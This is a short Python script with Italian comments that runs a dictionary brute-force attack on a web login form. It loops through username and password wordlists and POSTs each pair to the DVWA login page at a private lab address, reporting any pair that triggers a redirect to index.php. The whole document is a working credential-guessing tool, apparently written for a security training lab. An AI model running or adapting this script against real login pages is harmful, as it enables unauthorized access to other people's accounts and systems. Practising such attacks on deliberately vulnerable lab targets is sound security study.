import http.client, urllib.parse

username_file = open('nomi_utenti.txt')
password_file = open('password.txt')

user_list = username_file.readlines()
pass_list = password_file.readlines()

for user in user_list:
    user = user.rstrip()
    for psw in pass_list:
        psw = psw.rstrip()
        print(f"provo: {user} - {psw}")
        # il target vuole questo parametro: username=dsad&password=adssd&Login=Login
        post_par = urllib.parse.urlencode({'username': user, 'password': psw, 'Login': 'Login'})
        # preparo gli headers
        headers = {"Content-type": "application/x-www-form-urlencoded", "Accept": "text/html.application/xhtml+xml"}
        # configuriamo la connessione
        conn = http.client.HTTPConnection('192.168.50.101', 80)
        conn.request("POST", "/dvwa/login.php", post_par, headers)
        # attendiamo risposta
        response = conn.getresponse()
        if(response.getheader('location').endswith("index.php")):
            print("Logged with:",user, "-", psw)


